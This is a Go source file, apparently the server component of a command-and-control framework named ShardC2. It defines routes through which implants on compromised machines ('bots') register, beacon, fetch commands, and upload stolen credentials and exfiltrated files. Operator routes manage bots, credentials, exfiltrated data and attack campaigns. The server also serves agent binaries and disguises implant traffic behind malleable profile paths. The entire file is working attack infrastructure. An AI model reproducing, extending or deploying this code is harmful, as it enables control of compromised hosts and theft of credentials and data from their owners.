package server

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"os"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/limiter"
	"github.com/gofiber/fiber/v2/middleware/logger"
	"github.com/gofiber/fiber/v2/middleware/recover"
	"github.com/gofiber/websocket/v2"
	"github.com/shardc2/shardc2/internal/database"
	"github.com/shardc2/shardc2/internal/server/engine"
	"github.com/shardc2/shardc2/internal/server/handlers"
	"github.com/shardc2/shardc2/internal/server/middleware"
	"github.com/shardc2/shardc2/pkg/policy"
	"github.com/shardc2/shardc2/pkg/profiles"
)

type ServerConfig struct {
	OperatorToken string
	ImplantKey    string
	PayloadKey    []byte
	C2URL         string
	Profile       *profiles.Profile
	JWTSecret     []byte

	LoginRateLimitMax    int
	LoginRateLimitWindow time.Duration
	Policy               policy.Policy
}

type Server struct {
	app    *fiber.App
	db     *database.DB
	config ServerConfig
	logger *Logger
	engine *engine.Engine
}

func New(db *database.DB, cfg ServerConfig) *Server {
	app := fiber.New(fiber.Config{
		ServerHeader:          "",
		DisableStartupMessage: true,
		AppName:               "ShardC2",
		BodyLimit:             50 * 1024 * 1024,
	})

	app.Use(recover.New())
	app.Use(logger.New(logger.Config{
		Format: "${time} | ${status} | ${latency} | ${ip} | ${method} ${path}\n",
	}))

	s := &Server{app: app, db: db, config: cfg, logger: NewLogger(os.Stdout, "INFO"), engine: engine.NewWithPolicy(db, cfg.C2URL, cfg.ImplantKey, cfg.Policy)}
	s.setupRoutes()

	app.Static("/dashboard", "./web/dashboard")
	app.Get("/", func(c *fiber.Ctx) error {
		return c.Redirect("/dashboard/")
	})

	go s.engine.Start(context.Background())

	return s
}

func (s *Server) setupRoutes() {
	api := s.app.Group("/api/v1")

	api.Get("/health", func(c *fiber.Ctx) error {
		return c.JSON(fiber.Map{"status": "ok", "service": "shardc2"})
	})

	wsHub := handlers.NewWSHub()

	botHandler := handlers.NewBotHandler(s.db)
	cmdHandler := handlers.NewCommandHandler(s.db, wsHub)
	credHandler := handlers.NewCredentialHandler(s.db)
	campHandler := handlers.NewCampaignHandler(s.db, s.config.Policy)
	exfilHandler := handlers.NewExfilHandler(s.db)
	opHandler := handlers.NewOperatorHandler(s.db, s.config.JWTSecret)

	// Operator routes — accept legacy bearer token OR JWT
	opAuth := func(c *fiber.Ctx) error {
		auth := c.Get("Authorization")
		if len(auth) > 7 && auth[:7] == "Bearer " {
			token := auth[7:]
			if token == s.config.OperatorToken {
				c.Locals("operator_role", "admin")
				return c.Next()
			}
		}
		return middleware.JWTAuth(s.config.JWTSecret)(c)
	}

	// Agent routes using malleable profile paths
	implantMW := middleware.ImplantAuth(s.config.ImplantKey)
	agentMW := middleware.AgentAuth(s.db)
	payloadMW := middleware.PayloadCrypto(s.config.PayloadKey)
	agentLimiter := limiter.New(limiter.Config{Max: 60, Expiration: time.Minute})

	p := s.config.Profile
	if p == nil {
		p = profiles.Default()
	}

	api.Get("/agent/binary", opAuth, func(c *fiber.Ctx) error {
		arch := c.Query("arch", "arm64")
		if arch == "amd64" || arch == "x86_64" {
			return c.SendFile("./bin/shardc2-agent-amd64", false)
		}
		return c.SendFile("./bin/shardc2-agent", false)
	})

	s.app.Post(p.ServerPath("register"), payloadMW, implantMW, botHandler.Register)
	s.app.Post(p.ServerPath("beacon"), payloadMW, agentMW, agentLimiter, botHandler.AgentBeacon)
	s.app.Get(p.ServerPath("commands"), payloadMW, agentMW, agentLimiter, cmdHandler.AgentGetPending)
	s.app.Post(p.ServerPath("result"), payloadMW, agentMW, agentLimiter, cmdHandler.SubmitResult)
	s.app.Post(p.ServerPath("credentials"), payloadMW, agentMW, agentLimiter, credHandler.Submit)
	s.app.Post(p.ServerPath("exfil"), payloadMW, agentMW, agentLimiter, exfilHandler.Upload)
	s.app.Post(p.ServerPath("refresh_token"), payloadMW, agentMW, botHandler.RefreshToken)

	// WebSocket route (auth via query param)
	api.Use("/ws", handlers.WSUpgradeCheck())
	api.Get("/ws/terminal", func(c *fiber.Ctx) error {
		token := c.Query("token")
		if token == "" || token != s.config.OperatorToken {
			return c.Status(401).JSON(fiber.Map{"error": "unauthorized"})
		}
		return c.Next()
	}, websocket.New(handlers.WSHandler(wsHub)))

	// Operator auth & login routes
	loginLimitMax := s.config.LoginRateLimitMax
	if loginLimitMax == 0 {
		loginLimitMax = 5
	}
	loginLimitWindow := s.config.LoginRateLimitWindow
	if loginLimitWindow == 0 {
		loginLimitWindow = time.Minute
	}
	api.Post("/auth/login", limiter.New(limiter.Config{Max: loginLimitMax, Expiration: loginLimitWindow}), opHandler.Login)

	op := api.Group("", opAuth)
	op.Use(limiter.New(limiter.Config{Max: 120, Expiration: time.Minute}))

	bots := op.Group("/bots")
	bots.Get("/", botHandler.List)
	bots.Get("/:id", botHandler.Get)
	bots.Delete("/:id", botHandler.Remove)

	cmds := op.Group("/commands")
	cmds.Post("/", cmdHandler.Create)
	cmds.Post("/batch", cmdHandler.BatchCreate)
	cmds.Get("/history/:bot_id", cmdHandler.History)

	creds := op.Group("/credentials")
	creds.Post("/", credHandler.Submit)
	creds.Get("/", credHandler.List)
	creds.Delete("/:id", credHandler.Delete)

	camps := op.Group("/campaigns")
	camps.Post("/", campHandler.Create)
	camps.Get("/", campHandler.List)
	camps.Get("/:id", campHandler.Get)
	camps.Put("/:id", campHandler.Update)
	camps.Delete("/:id", campHandler.Delete)
	camps.Post("/:id/bots", campHandler.AssignBots)
	camps.Delete("/:id/bots/:bot_id", campHandler.RemoveBot)
	camps.Get("/:id/bots", campHandler.ListBots)
	camps.Post("/:id/launch", campHandler.Launch)
	camps.Get("/:id/progress", campHandler.Progress)
	camps.Get("/:id/results", campHandler.Results)

	exfil := op.Group("/exfil")
	exfil.Get("/", exfilHandler.List)
	exfil.Get("/:id", exfilHandler.Download)
	exfil.Delete("/:id", exfilHandler.Delete)

	op.Get("/stats", botHandler.Stats)

	// Admin-only operator management
	opAdmin := op.Group("/operators", func(c *fiber.Ctx) error {
		role, _ := c.Locals("operator_role").(string)
		if role != "admin" {
			return c.Status(403).JSON(fiber.Map{"error": "admin access required"})
		}
		return c.Next()
	})
	opAdmin.Post("/", opHandler.Register)
	opAdmin.Get("/", opHandler.List)
	opAdmin.Delete("/:id", opHandler.Deactivate)
}

func (s *Server) Start(addr string) error {
	fmt.Printf("[*] C2 Server listening on %s\n", addr)
	return s.app.Listen(addr)
}

func (s *Server) StartTLS(addr, certFile, keyFile string) error {
	fmt.Printf("[*] C2 Server listening on %s (TLS)\n", addr)
	return s.app.ListenTLS(addr, certFile, keyFile)
}

func (s *Server) Shutdown() error {
	return s.app.Shutdown()
}

func GenerateSelfSignedCert(certPath, keyPath string) error {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return fmt.Errorf("generate key: %w", err)
	}

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{Organization: []string{"ShardC2"}},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, &key.PublicKey, key)
	if err != nil {
		return fmt.Errorf("create certificate: %w", err)
	}

	cf, err := os.Create(certPath)
	if err != nil {
		return fmt.Errorf("create cert file: %w", err)
	}
	defer cf.Close()
	pem.Encode(cf, &pem.Block{Type: "CERTIFICATE", Bytes: certDER})

	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return fmt.Errorf("marshal key: %w", err)
	}
	kf, err := os.OpenFile(keyPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return fmt.Errorf("create key file: %w", err)
	}
	defer kf.Close()
	pem.Encode(kf, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	return nil
}
